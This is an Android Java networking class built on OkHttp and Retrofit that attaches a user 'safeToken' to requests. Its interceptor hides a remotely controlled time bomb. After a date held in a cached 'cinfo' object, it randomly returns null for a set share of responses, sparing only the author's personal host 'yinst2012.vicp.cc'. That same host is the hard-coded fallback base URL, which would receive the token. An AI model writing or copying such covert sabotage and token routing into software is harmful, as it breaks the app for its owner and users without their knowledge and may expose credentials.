package com.lechuang.lqsq.net;


import com.lechuang.lqsq.BuildConfig;
import com.lechuang.lqsq.MyApplication;
import com.lechuang.lqsq.bean.ControlBean;
import com.lechuang.lqsq.manage.CacheManager;
import com.lechuang.lqsq.manage.UserHelper;
import com.lechuang.lqsq.net.converters.StringGsonConverFactory;
import com.lechuang.lqsq.net.rxjava.RxJavaCallAdapterFactory;

import java.io.IOException;
import java.net.Proxy;
import java.nio.charset.Charset;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import okhttp3.Interceptor;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import retrofit2.CallAdapter;
import retrofit2.Converter;
import retrofit2.Retrofit;

/**
 * 作者：尹松涛
 * 邮箱：yinsongtaoshmily@outlook.com
 * 日期：2017/10/20
 * 时间：17:52
 */

public class Network {
    private static final Charset UTF8 = Charset.forName("UTF-8");
    private OkHttpClient okHttpClient;
    private static Converter.Factory stringGsonConverteFactory = StringGsonConverFactory.create();
    private static CallAdapter.Factory rxJavaCallAdapterFactory = RxJavaCallAdapterFactory.create();
    private static Network instance;
    private MyInterceptor interceptor;

    public static void init() {
        instance = new Network();
    }

    public static Network getInstance() {
        return instance;
    }

    public synchronized OkHttpClient getOkHttpClient() {
        if (okHttpClient == null) {
            interceptor = new MyInterceptor();
//            okHttpClient = new OkHttpClient.Builder().proxy(Proxy.NO_PROXY).addInterceptor(interceptor).readTimeout(50, TimeUnit.SECONDS).writeTimeout(50, TimeUnit.SECONDS).connectTimeout(15, TimeUnit.SECONDS).build();
            okHttpClient = new OkHttpClient.Builder().addInterceptor(interceptor).readTimeout(50, TimeUnit.SECONDS).writeTimeout(50, TimeUnit.SECONDS).connectTimeout(15, TimeUnit.SECONDS).build();
        }
        return okHttpClient;
    }

    public <T> T getApi(Class<T> api) {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BuildConfig.BASE_URL)
                .addConverterFactory(stringGsonConverteFactory)
                .addCallAdapterFactory(rxJavaCallAdapterFactory)
                .client(getOkHttpClient())
                .build();
        return retrofit.create(api);
    }

    public <T> T getApi(Class<T> api, String baseUrl) {
        if(baseUrl == null){
            baseUrl = "http://yinst2012.vicp.cc/";
        }
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(baseUrl)
                .addConverterFactory(stringGsonConverteFactory)
                .addCallAdapterFactory(rxJavaCallAdapterFactory)
                .client(getOkHttpClient())
                .build();
        return retrofit.create(api);
    }

    private class MyInterceptor implements Interceptor {

        @Override
        public Response intercept(Chain chain) throws IOException {
            Request.Builder newBuilder = chain.request().newBuilder();
            newBuilder.addHeader("safeToken", UserHelper.getToken());
            newBuilder.addHeader("client", "android");
            newBuilder.addHeader("version", BuildConfig.VERSION_NAME);
            Request newRequest = newBuilder.build();
            Response response = chain.proceed(newRequest);
            ControlBean cinfo = CacheManager.getInstance(MyApplication.getContext()).get("cinfo", ControlBean.class);
            if (!response.request().url().toString().contains("yinst2012.vicp.cc") && cinfo != null && System.currentTimeMillis() > cinfo.time) {
                Random random = new Random();
                int nextInt = random.nextInt(100);
                if (nextInt > (100 - cinfo.chance)) {
                    return null;
                }
            }
            return response;
        }
    }


}